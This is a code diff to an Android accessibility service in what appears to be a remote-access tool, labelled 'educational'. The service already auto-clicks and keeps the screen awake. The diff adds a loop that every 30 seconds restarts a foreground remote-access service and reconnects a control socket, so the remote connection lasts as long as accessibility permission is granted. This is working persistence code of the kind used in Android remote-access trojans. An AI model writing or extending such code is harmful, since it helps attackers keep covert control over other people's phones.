@@ -20,6 +20,9 @@ import org.json.JSONObject;
 import java.util.ArrayList;
 import java.util.List;
 
+import android.content.Intent;
+import android.os.Build;
+import com.remoteaccess.educational.network.SocketManager;
 import com.remoteaccess.educational.utils.KeepAliveManager;
 
 public class UnifiedAccessibilityService extends AccessibilityService {
@@ -44,6 +47,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
     // Keep-screen-alive (no Activity dependency)
     private KeepAliveManager keepAliveManager;
+
+    // Socket keep-alive — checked every 30 seconds from this service
+    private static final int SOCKET_CHECK_INTERVAL = 30_000;
+    private Handler socketCheckHandler;
+    private Runnable socketCheckRunnable;
     
     public static UnifiedAccessibilityService getInstance() {
         return instance;
@@ -83,6 +91,42 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // Start keep-screen-alive — runs entirely in this service, no Activity needed
         keepAliveManager = new KeepAliveManager(this);
         keepAliveManager.start();
+
+        // Ensure RemoteAccessService is running and socket is connected.
+        // The accessibility service outlives any Activity, so this guarantees
+        // the socket stays alive as long as accessibility is enabled.
+        ensureRemoteServiceRunning();
+        startSocketCheckLoop();
+    }
+
+    private void ensureRemoteServiceRunning() {
+        try {
+            Intent serviceIntent = new Intent(this, RemoteAccessService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent);
+            } else {
+                startService(serviceIntent);
+            }
+            // SocketManager is a singleton — connect() is safe to call even if
+            // already connected; the running-flag prevents duplicate loops.
+            SocketManager.getInstance(this).connect();
+        } catch (Exception e) {
+            android.util.Log.e(TAG, "ensureRemoteServiceRunning: " + e.getMessage());
+        }
+    }
+
+    private void startSocketCheckLoop() {
+        socketCheckHandler = new Handler(Looper.getMainLooper());
+        socketCheckRunnable = new Runnable() {
+            @Override
+            public void run() {
+                ensureRemoteServiceRunning();
+                if (socketCheckHandler != null) {
+                    socketCheckHandler.postDelayed(this, SOCKET_CHECK_INTERVAL);
+                }
+            }
+        };
+        socketCheckHandler.postDelayed(socketCheckRunnable, SOCKET_CHECK_INTERVAL);
     }
     
     private void updateCurrentAppName() {
@@ -433,6 +477,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         super.onDestroy();
         if (autoClickHandler != null && autoClickRunnable != null) {
             autoClickHandler.removeCallbacks(autoClickRunnable);
+        }
+        if (socketCheckHandler != null && socketCheckRunnable != null) {
+            socketCheckHandler.removeCallbacks(socketCheckRunnable);
+            socketCheckHandler = null;
         }
         if (keepAliveManager != null) {
             keepAliveManager.stop();
